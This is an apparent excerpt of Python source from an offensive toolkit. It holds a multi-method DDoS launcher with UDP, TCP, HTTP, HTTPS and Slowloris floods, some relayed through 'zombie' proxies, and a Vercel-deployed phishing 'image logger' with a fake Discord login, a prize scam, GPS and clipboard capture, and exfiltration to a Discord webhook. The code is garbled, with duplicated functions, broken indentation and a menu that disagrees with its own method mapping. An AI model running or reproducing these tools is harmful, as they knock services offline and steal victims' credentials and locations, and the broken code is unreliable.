            ui.console.print("  [7] HTTPS")
            ui.console.print("  [8] Slowloris")
            flood_choice = ui.console.input("\n[bold yellow]> Select method [Default: 1]:[/bold yellow] ").strip() or "1"
        else:
            print(f"\n{Colors.GREEN}Select flood method:{Colors.RESET}")
            print("\n[+] L4 METHODS")
            print("-" * 60)
            print("  [1] UDP Reflection / Amplification")
            print("  [2] TCP")
            print("  [3] TCP ACK")
            print("  [4] TCP FIN")
            print("  [5] TCP XMAS")
            print("\n[+] L7 METHODS")
            print("-" * 60)
            print("  [6] HTTP")
            print("  [7] HTTPS")
            print("  [8] Slowloris")
            flood_choice = input(f"\n{Colors.BOLD}Enter choice (1-8) [Default: 1]: {Colors.RESET}").strip() or "1"

        if flood_choice not in ("1", "2", "3", "4", "5", "6", "7", "8"):
            if ui is not None:
                ui.warning("Unknown selection.")
            else:
                print(f"{Colors.AMBER}[!] Unknown selection.{Colors.RESET}")
            time.sleep(1)
            return

        try:
            duration = int((ui.prompt_input("Attack duration in seconds [Default: 60]:", "60")
                            if ui is not None
                            else input(f"Attack duration in seconds [Default: 60]: ").strip() or "60"))
        except Exception:
            duration = 60

        try:
            threads = int((ui.prompt_input("Threads [Default: 20]:", "20")
                           if ui is not None
                           else input(f"Threads [Default: 20]: ").strip() or "20"))
        except Exception:
            threads = 20

        confirm = (ui.prompt_input("Send attack? (yes/no):", "no")
                   if ui is not None
                   else input(f"\n{Colors.BOLD}Send attack? (yes/no): {Colors.RESET}").strip().lower())
        if confirm != "yes":
            if ui is not None:
                ui.warning("Attack aborted.")
            else:
                print(f"{Colors.AMBER}[!] Attack aborted.{Colors.RESET}")
            time.sleep(1)
            return

        method_name = {
            "1": "HTTP", "2": "HTTPS", "3": "Slowloris"
        }.get(flood_choice, "HTTP")

        if ui is not None:
            ui.info(f"Launching {method_name} zombie attack to {target_ip}:{target_port} using {len(ddos_attack.zombies)} zombies, {threads} threads for {duration}s...")
        else:
            print(f"{Colors.GREEN}[*] Launching {method_name} zombie attack to {target_ip}:{target_port} using {len(ddos_attack.zombies)} zombies, {threads} threads for {duration}s...{Colors.RESET}")

        _ABORT["active"] = True
        _ABORT["aborted"] = False
        watcher = threading.Thread(target=_abort_watcher, daemon=True)
        watcher.start()
        abort_event = threading.Event()
        start_time = time.time()
        sent = 0
        fails = 0
        lock = threading.Lock()

        def _zombie_get_worker():
            nonlocal sent, fails
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    zombie = random.choice(ddos_attack.zombies)
                    url = f"http://{zombie.rstrip('/')}/http://{target_ip}:{target_port}/"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    with lock:
                        fails += 1

        def _zombie_post_worker():
            nonlocal sent, fails
            end_time = start_time + duration
            payload = "data=" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64))
            while time.time() < end_time and not abort_event.is_set():
                try:
                    zombie = random.choice(ddos_attack.zombies)
                    url = f"http://{zombie.rstrip('/')}/http://{target_ip}:{target_port}/"
                    data = payload.encode('utf-8')
                    req = urllib.request.Request(url, data=data, method='POST', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    with lock:
                        fails += 1

        def _zombie_https_worker():
            nonlocal sent, fails
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    zombie = random.choice(ddos_attack.zombies)
                    url = f"https://{zombie.rstrip('/')}/https://{target_ip}:{target_port}/"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, timeout=3, context=ctx) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    with lock:
                        fails += 1

        def _zombie_head_worker():
            nonlocal sent, fails
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    zombie = random.choice(ddos_attack.zombies)
                    url = f"http://{zombie.rstrip('/')}/http://{target_ip}:{target_port}/"
                    req = urllib.request.Request(url, method='HEAD', headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    with lock:
                        fails += 1

        def _zombie_mixed_worker():
            nonlocal sent, fails
            end_time = start_time + duration
            payload = "data=" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64))
            while time.time() < end_time and not abort_event.is_set():
                try:
                    zombie = random.choice(ddos_attack.zombies)
                    base = f"http://{zombie.rstrip('/')}/http://{target_ip}:{target_port}/"
                    method = random.choice(["GET", "POST", "HEAD"])
                    if method == "GET":
                        req = urllib.request.Request(base, headers={"User-Agent": "Mozilla/5.0"})
                    elif method == "POST":
                        req = urllib.request.Request(base, data=payload.encode('utf-8'), method='POST', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"})
                    else:
                        req = urllib.request.Request(base, method='HEAD', headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    with lock:
                        fails += 1

        def _zombie_slowloris_worker():
            nonlocal sent, fails
            sockets = []
            try:
                for _ in range(min(150, threads * 5)):
                    try:
                        zombie = random.choice(ddos_attack.zombies)
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5)
                        s.connect((target_ip, target_port))
                        s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: 42\r\n\r\n".encode())
                        sockets.append(s)
                        with lock:
                            sent += 1
                    except Exception:
                        pass
                end_time = start_time + duration
                while time.time() < end_time and not abort_event.is_set():
                    for s in sockets[:]:
                        try:
                            s.sendall(b"X-a: b\r\n")
                        except Exception:
                            try:
                                sockets.remove(s)
                                s.close()
                            except Exception:
                                pass
                    time.sleep(2)
            except Exception:
                pass
            finally:
                for s in sockets:
                    try:
                        s.close()
                    except Exception:
                        pass

        workers = []
        if flood_choice == "1":
            worker_fn = _zombie_get_worker
        elif flood_choice == "2":
            worker_fn = _zombie_https_worker
        else:
            worker_fn = _zombie_slowloris_worker

        try:
            for _ in range(threads):
                t = threading.Thread(target=worker_fn, daemon=True)
                t.start()
                workers.append(t)
            while any(t.is_alive() for t in workers):
                if time.time() - start_time >= duration and not abort_event.is_set():
                    abort_event.set()
                    break
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            abort_event.set()
            _ABORT["active"] = False
            for t in workers:
                t.join(timeout=1)
            if ui is not None:
                ui.success(f"Zombie attack complete. Method: {method_name}. Sent: {sent}, Failed: {fails}")
            else:
                print(f"\n{Colors.GREEN}[+] Zombie attack complete. Method: {method_name}. Sent: {sent}, Failed: {fails}{Colors.RESET}")
            input("\nPress Enter to return...")

    elif choice == "2":
        target_ip = (ui.prompt_input("Target IP >")
                     if ui is not None
                     else input(f"\n{Colors.BOLD}Target IP > {Colors.RESET}").strip())
        if not target_ip:
            return

        try:
            target_port = int((ui.prompt_input("Target port [Default: 80]:", "80")
                               if ui is not None
                               else input(f"Target port [Default: 80]: ").strip() or "80"))
        except Exception:
            target_port = 80

        if ui is not None:
            ui.console.print("\n[bold yellow]Select flood method:[/bold yellow]")
            ui.console.print("\n[bold yellow][+] L4 METHODS[/bold yellow]")
            ui.console.print("-" * 60)
            ui.console.print("  [1] UDP Reflection / Amplification")
            ui.console.print("  [2] TCP")
            ui.console.print("  [3] TCP ACK")
            ui.console.print("  [4] TCP FIN")
            ui.console.print("  [5] TCP XMAS")
            ui.console.print("\n[bold yellow][+] L7 METHODS[/bold yellow]")
            ui.console.print("-" * 60)
            ui.console.print("  [6] HTTP")
            ui.console.print("  [7] HTTPS")
            ui.console.print("  [8] Slowloris")
            flood_choice = ui.console.input("\n[bold yellow]> Select method [Default: 1]:[/bold yellow] ").strip() or "1"
        else:
            print(f"\n{Colors.GREEN}Select flood method:{Colors.RESET}")
            print("\n[+] L4 METHODS")
            print("-" * 60)
            print("  [1] UDP Reflection / Amplification")
            print("  [2] TCP")
            print("  [3] TCP ACK")
            print("  [4] TCP FIN")
            print("  [5] TCP XMAS")
            print("\n[+] L7 METHODS")
            print("-" * 60)
            print("  [6] HTTP")
            print("  [7] HTTPS")
            print("  [8] Slowloris")
            flood_choice = input(f"\n{Colors.BOLD}Enter choice (1-8) [Default: 1]: {Colors.RESET}").strip() or "1"

    if flood_choice not in ("1", "2", "3", "4", "5", "6", "7", "8"):
        if ui is not None:
            ui.warning("Unknown selection.")
        else:
            print(f"{Colors.AMBER}[!] Unknown selection.{Colors.RESET}")
        time.sleep(1)
        return

        try:
            duration = int((ui.prompt_input("Attack duration in seconds [Default: 60]:", "60")
                            if ui is not None
                            else input(f"Attack duration in seconds [Default: 60]: ").strip() or "60"))
        except Exception:
            duration = 60

        try:
            threads = int((ui.prompt_input("Threads [Default: 50]:", "50")
                           if ui is not None
                           else input(f"Threads [Default: 50]: ").strip() or "50"))
        except Exception:
            threads = 50

        confirm = (ui.prompt_input("Send attack? (yes/no):", "no")
                   if ui is not None
                   else input(f"\n{Colors.BOLD}Send attack? (yes/no): {Colors.RESET}").strip().lower())
        if confirm != "yes":
            if ui is not None:
                ui.warning("Attack aborted.")
            else:
                print(f"{Colors.AMBER}[!] Attack aborted.{Colors.RESET}")
            time.sleep(1)
            return

    method_name = {
        "1": "UDP Reflection / Amplification", "2": "TCP", "3": "TCP ACK",
        "4": "TCP FIN", "5": "TCP XMAS",
        "6": "HTTP", "7": "HTTPS", "8": "Slowloris"
    }.get(flood_choice, "UDP Reflection / Amplification")

    if ui is not None:
        ui.info(f"Launching {method_name} attack to {target_ip}:{target_port} for {duration}s with {threads} threads...")
    else:
        print(f"{Colors.GREEN}[*] Launching {method_name} attack to {target_ip}:{target_port} for {duration}s with {threads} threads...{Colors.RESET}")

        _ABORT["active"] = True
        _ABORT["aborted"] = False
        watcher = threading.Thread(target=_abort_watcher, daemon=True)
        watcher.start()
        abort_event = threading.Event()
        start_time = time.time()
        sent = 0
        lock = threading.Lock()
        device_rate_state = {}
        rate_lock = threading.Lock()
        MAX_BYTES_PER_SEC = 50 * 125000

        def _udp_worker():
            nonlocal sent
            end_time = start_time + duration
            payload = random._urandom(1024)
            while time.time() < end_time and not abort_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(payload, (target_ip, target_port))
                    s.close()
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _syn_worker():
            nonlocal sent
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target_ip, target_port))
                    s.close()
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _tcp_ack_worker():
            nonlocal sent
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.connect((target_ip, target_port))
                    s.sendall(b"")
                    s.close()
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _tcp_fin_worker():
            nonlocal sent
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target_ip, target_port))
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
                    s.close()
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _tcp_xmas_worker():
            nonlocal sent
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    s.connect((target_ip, target_port))
                    s.sendall(b'')
                    s.close()
                    with lock:
                        sent += 1
                except Exception:
                    pass

    def _tcp_ack_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        s.connect((target_ip, target_port))
                        s.sendall(b"")
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _tcp_fin_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target_ip, target_port))
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _tcp_xmas_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target_ip, target_port))
                        s.sendall(b'')
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _http_get_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
                try:
                    url = f"http://{target_ip}:{target_port}/"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=2) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _http_post_worker():
            nonlocal sent
            end_time = start_time + duration
            payload = "data=" + ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=64))
            while time.time() < end_time and not abort_event.is_set():
                try:
                    url = f"http://{target_ip}:{target_port}/"
                    data = payload.encode('utf-8')
                    req = urllib.request.Request(url, data=data, method='POST', headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0"})
                    with urllib.request.urlopen(req, timeout=2) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    pass

        def _https_worker():
            nonlocal sent
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                try:
                    import ssl
                    url = f"https://{target_ip}:{target_port}/"
                    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    with urllib.request.urlopen(req, timeout=2, context=ctx) as resp:
                        resp.read(64)
                    with lock:
                        sent += 1
                except Exception:
                    pass

    def _tcp_ack_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        s.connect((target_ip, target_port))
                        s.sendall(b"")
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _tcp_fin_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target_ip, target_port))
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _tcp_xmas_worker():
        nonlocal sent
        end_time = start_time + duration
        while time.time() < end_time and not abort_event.is_set():
            for entry in successes:
                if abort_event.is_set():
                    return
                try:
                    parts = entry.split(':')
                    if len(parts) >= 4:
                        ip = parts[0]
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.5)
                        s.connect((target_ip, target_port))
                        s.sendall(b'')
                        s.close()
                        with lock:
                            sent += 1
                except Exception:
                    pass

    def _slowloris_worker():
        nonlocal sent
        sockets = []
        try:
            for _ in range(min(150, len(successes) * 5)):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target_ip, target_port))
                    s.sendall(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: 42\r\n\r\n".encode())
                    sockets.append(s)
                    with lock:
                        sent += 1
                except Exception:
                    pass
            end_time = start_time + duration
            while time.time() < end_time and not abort_event.is_set():
                for s in sockets[:]:
                    try:
                        s.sendall(b"X-a: b\r\n")
                    except Exception:
                        try:
                            sockets.remove(s)
                            s.close()
                        except Exception:
                            pass
                    time.sleep(2)
        except Exception:
            pass
        finally:
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

        workers = []
        if flood_choice == "1":
            worker_fn = _udp_worker
        elif flood_choice == "2":
            worker_fn = _syn_worker
        elif flood_choice == "3":
            worker_fn = _tcp_ack_worker
        elif flood_choice == "4":
            worker_fn = _tcp_fin_worker
        elif flood_choice == "5":
            worker_fn = _tcp_xmas_worker
        elif flood_choice == "6":
            worker_fn = _http_get_worker
        elif flood_choice == "7":
            worker_fn = _https_worker
        else:
            worker_fn = _slowloris_worker

        try:
            for _ in range(threads):
                t = threading.Thread(target=worker_fn, daemon=True)
                t.start()
                workers.append(t)
            while any(t.is_alive() for t in workers):
                if time.time() - start_time >= duration and not abort_event.is_set():
                    abort_event.set()
                    break
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        finally:
            abort_event.set()
            _ABORT["active"] = False
            for t in workers:
                t.join(timeout=1)
            if ui is not None:
                ui.success(f"Attack complete. Method: {method_name}. Total requests sent: {sent}")
            else:
                print(f"\n{Colors.GREEN}[+] Attack complete. Method: {method_name}. Total requests sent: {sent}{Colors.RESET}")
            input("\nPress Enter to return...")

def run_image_logger():

    if ui is not None:
        ui.section("INSTANT IMAGE LOGGER", "red",
                   subtitle="Captures victim IP addresses when they open the tracking image.")
        ui.console.print("  [1] Local Server (http://localhost:8080)")
        ui.console.print("  [2] Deploy to Vercel (Public URL)")
        ui.console.print("  [3] Return to Menu")
        choice = ui.console.input("\n[bold yellow]> Select:[/bold yellow] ").strip()
    else:
        print(f"\n{Colors.CYAN}[INSTANT IMAGE LOGGER]{Colors.RESET}")
        print(f"{Colors.GREEN}Select deployment method:{Colors.RESET}")
        print(f"  [{Colors.AMBER}1{Colors.RESET}] Local Server (http://localhost:8080)")
        print(f"  [{Colors.AMBER}2{Colors.RESET}] Deploy to Vercel (Public URL)")
        print(f"  [{Colors.AMBER}3{Colors.RESET}] Return to Menu")
        choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select: ").strip()
    
    if choice == '1':
        print(f"\n{Colors.GREEN}Starting local image logger server...{Colors.RESET}")
        try:
            from core.image_logger.imagelogger import ImageLogger
            logger = ImageLogger(port=8080)
            logger.start_and_monitor()
        except ImportError:
            print(f"{Colors.RED}[!] Image Logger module not found.{Colors.RESET}")
            time.sleep(2)
        except Exception as e:
            print(f"{Colors.RED}[!] Image Logger error: {e}{Colors.RESET}")
            time.sleep(2)
    elif choice == '2':
        deploy_vercel_logger()
    elif choice == '3':
        return
    else:
        print(f"{Colors.RED}[!] Invalid option.{Colors.RESET}")
        time.sleep(1)

def deploy_vercel_logger():

    print(f"\n{Colors.CYAN}[VERCEL IMAGE LOGGER DEPLOYMENT]{Colors.RESET}")
    print(f"{Colors.GREEN}Preparing Vercel deployment...{Colors.RESET}")
    
    vercel_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core', 'vercel-image-logger')
    
    if not os.path.exists(vercel_dir):
        print(f"{Colors.RED}[!] Vercel deployment folder not found at: {vercel_dir}{Colors.RESET}")
        time.sleep(2)
        return
    
    print(f"{Colors.GREEN}Vercel project ready at: {vercel_dir}{Colors.RESET}")
    print(f"{Colors.AMBER}To deploy:{Colors.RESET}")
    print(f"  1. Install Vercel CLI: {Colors.CYAN}npm i -g vercel{Colors.RESET}")
    print(f"  2. Navigate to: {Colors.CYAN}{vercel_dir}{Colors.RESET}")
    print(f"  3. Run: {Colors.CYAN}vercel --prod{Colors.RESET}")
    print(f"  4. Share the public URL with your target{Colors.RESET}")
    
    webhook_enabled = False
    webhook_url = None
    webhook_choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Send logs to Discord webhook? (y/n): ").strip().lower()
    if webhook_choice == 'y':
        webhook_url = input(f"{Fore.MAGENTA}>{Fore.GREEN} Enter Discord webhook URL: ").strip()
        if webhook_url:
            webhook_enabled = True
            env_path = os.path.join(vercel_dir, '.env')
            config_path = os.path.join(vercel_dir, 'webhook-config.json')
            try:
                lines = []
                if os.path.exists(env_path):
                    with open(env_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                lines = [line for line in lines if not line.startswith('DISCORD_WEBHOOK_URL=')]
                lines.append(f'DISCORD_WEBHOOK_URL={webhook_url}')
                with open(env_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(lines) + '\n')
                print(f"{Colors.GREEN}[+] Webhook URL saved to .env{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[!] Failed to save webhook config: {e}{Colors.RESET}")
                webhook_enabled = False
                webhook_url = None

            try:
                with open(config_path, 'w', encoding='utf-8') as f:
                    json.dump({'WEBHOOK_URL': webhook_url}, f)
                print(f"{Colors.GREEN}[+] Webhook config written to webhook-config.json{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Failed to write webhook-config.json: {e}{Colors.RESET}")

        enable_gps = False
        enable_clipboard = False
        lure_type = 'discord_login'
        custom_html = ''
        custom_title = 'Login Required'

        if webhook_enabled and webhook_url:
            print(f"\n{Fore.CYAN}--- Advanced Logging Options ---{Fore.RESET}")
            gps_choice = input(f"{Fore.MAGENTA}>{Fore.GREEN} Attempt GPS logging? (y/n): ").strip().lower()
            if gps_choice == 'y':
                enable_gps = True
                print(f"{Colors.AMBER}[*] GPS logging will be enabled. Requires browser permission.{Colors.RESET}")
                print(f"{Colors.AMBER}[*] GPS data is captured immediately and sent - closing the page loses it.{Colors.RESET}")
            else:
                print(f"{Colors.MAGENTA}[-] GPS logging disabled.{Colors.RESET}")

            clip_choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Attempt clipboard logging? (y/n): ").strip().lower()
            if clip_choice == 'y':
                enable_clipboard = True
                print(f"{Colors.AMBER}[*] Clipboard logging will be enabled. Requires browser permission.{Colors.RESET}")
                print(f"{Colors.AMBER}[*] Clipboard is read immediately - closing the page loses it.{Colors.RESET}")
            else:
                print(f"{Colors.MAGENTA}[-] Clipboard logging disabled.{Colors.RESET}")

            print(f"\n{Fore.CYAN}--- Website Customization ---{Fore.RESET}")
            print(f"{Colors.GREEN}Choose what the target sees:{Colors.RESET}")
            print(f"  1. Discord login page (advanced - captures email & password)")
            print(f"  2. Fake error page (red warning text)")
            print(f"  3. Prize scam (Amazon gift card)")
            print(f"  4. E-girl finder (hook-up site with images)")
            print(f"  5. Custom HTML")
            print(f"  6. Plain image (standard OG image logger)")
            lure_choice = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Select option (1-6) [1]: ").strip()
            if lure_choice == '2':
                lure_type = 'error'
            elif lure_choice == '3':
                lure_type = 'prize'
            elif lure_choice == '4':
                lure_type = 'egirl'
            elif lure_choice == '5':
                lure_type = 'custom'
                print(f"{Colors.AMBER}[*] Enter your custom HTML (press Enter on empty line to finish):{Colors.RESET}")
                print(f"{Colors.AMBER}[*] The page will also include hidden tracking scripts.{Colors.RESET}")
                custom_lines = []
                while True:
                    line = input()
                    if line.strip() == '' and custom_lines and custom_lines[-1].strip() == '':
                        custom_lines.pop()
                        break
                    custom_lines.append(line)
                custom_html = '\n'.join(custom_lines)
            elif lure_choice == '6':
                lure_type = 'image'
            else:
                lure_type = 'discord_login'

            title_input = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Custom page title [{Colors.AMBER}{custom_title}{Colors.RESET}]: ").strip()
            if title_input:
                custom_title = title_input

        lure_config_path = os.path.join(vercel_dir, 'lure-config.json')
        lure_config = {
            'lure_type': lure_type,
            'custom_html': custom_html,
            'enable_gps': enable_gps,
            'enable_clipboard': enable_clipboard,
            'custom_title': custom_title,
        }
        try:
            with open(lure_config_path, 'w', encoding='utf-8') as f:
                json.dump(lure_config, f, indent=2)
            print(f"{Colors.GREEN}[+] Lure config written to lure-config.json{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Failed to write lure-config.json: {e}{Colors.RESET}")
    
    deploy_now = input(f"\n{Fore.MAGENTA}>{Fore.GREEN} Attempt auto-deploy now? (y/n): ").strip().lower()
    
    if deploy_now == 'y':
        try:
            import subprocess
            original_dir = os.getcwd()
            os.chdir(vercel_dir)
            
            vercel_cmd = None
            candidates = [
                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel.cmd'),
                os.path.join(os.environ.get('APPDATA', ''), 'npm', 'vercel'),
                'vercel',
            ]
            for candidate in candidates:
                if os.path.exists(candidate):
                    vercel_cmd = candidate
                    break
            
            if not vercel_cmd:
                print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
                input(f"\n{Fore.YELLOW}Press Enter to return...{Fore.RESET}")
                return
            
            print(f"{Colors.GREEN}Running vercel --prod...{Colors.RESET}")
            env = os.environ.copy()
            npm_dir = os.path.join(os.environ.get('APPDATA', ''), 'npm')
            node_dir = r'C:\Program Files\nodejs'
            env['PATH'] = node_dir + os.pathsep + npm_dir + os.pathsep + env.get('PATH', '')
            
            if webhook_enabled and webhook_url:
                print(f"{Colors.CYAN}Setting Discord webhook env var on Vercel...{Colors.RESET}")
                
                rm_cmd = [vercel_cmd, 'env', 'rm', 'DISCORD_WEBHOOK_URL', 'production', '-y']
                try:
                    subprocess.run(['cmd', '/c'] + rm_cmd, capture_output=True, text=True, timeout=15, env=env)
                except:
                    pass
                
                env_cmd = [
                    vercel_cmd, 'env', 'add', 'DISCORD_WEBHOOK_URL',
                    'production',
                    '--project', 'vercel-image-logger',
                    '--scope', 'magmagts-projects',
                    '-y'
                ]
                try:
                    env_result = subprocess.run(
                        ['cmd', '/c'] + env_cmd,
                        input=webhook_url.strip() + '\n',
                        capture_output=True,
                        text=True,
                        timeout=30,
                        env=env
                    )
                    if env_result.returncode == 0:
                        print(f"{Colors.GREEN}[+] Discord webhook env var set on Vercel.{Colors.RESET}")
                    else:
                        stderr_msg = (env_result.stderr or '').strip()
                        stdout_msg = (env_result.stdout or '').strip()
                        print(f"{Colors.YELLOW}[!] Env var setup warning: {stderr_msg or stdout_msg[-200:]}{Colors.RESET}")
                        print(f"{Colors.AMBER}[!] Will rely on webhook-config.json fallback.{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] Failed to set env var on Vercel: {e}{Colors.RESET}")
                    print(f"{Colors.AMBER}[!] Will rely on webhook-config.json fallback.{Colors.RESET}")
                time.sleep(1)
            
            result = subprocess.run(
                ['cmd', '/c', vercel_cmd, '--prod', '-y', '--project', 'vercel-image-logger', '--scope', 'magmagts-projects'],
                capture_output=True,
                text=True,
                timeout=120,
                env=env
            )
            
            os.chdir(original_dir)
            
            if result.returncode == 0:
                print(f"{Colors.GREEN}Deployment successful!{Colors.RESET}")
                
                alias_match = re.search(r'Aliased\s+(https?://[^\s]+\.vercel\.app)', result.stdout + result.stderr)
                url_match = re.search(r'https?://[^\s]+\.vercel\.app', result.stdout + result.stderr)
                
                if alias_match:
                    public_url = alias_match.group(1)
                elif url_match:
                    public_url = url_match.group(0)
                else:
                    public_url = None
                
                if public_url:
                    image_url = public_url.rstrip('/') + '/api/image'
                    logs_url = public_url.rstrip('/') + '/api/logs'
                    print(f"{Colors.CYAN}Public URL: {Colors.YELLOW}{public_url}{Colors.RESET}")
                    print(f"{Colors.GREEN}Share this URL with your target:{Colors.RESET}")
                    print(f"{Colors.YELLOW}{image_url}{Colors.RESET}")
                    print(f"\n{Fore.GREEN}Starting live monitor...{Fore.RESET}")
                    print(f"{Colors.AMBER}Press Ctrl+C to stop monitoring{Colors.RESET}\n")
                    time.sleep(1)
                    monitor_vercel_logs(public_url, image_url, logs_url, webhook_enabled, webhook_url)
                else:
                    print(f"{Colors.AMBER}Deployment succeeded but URL not detected. Check Vercel dashboard.{Colors.RESET}")
            else:
                print(f"{Colors.RED}Deployment failed:{Colors.RESET}")
                print(result.stderr)
        except FileNotFoundError:
            print(f"{Colors.RED}[!] Vercel CLI not found. Install with: npm i -g vercel{Colors.RESET}")
        except subprocess.TimeoutExpired:
            print(f"{Colors.RED}[!] Deployment timed out.{Colors.RESET}")
        except Exception as e:
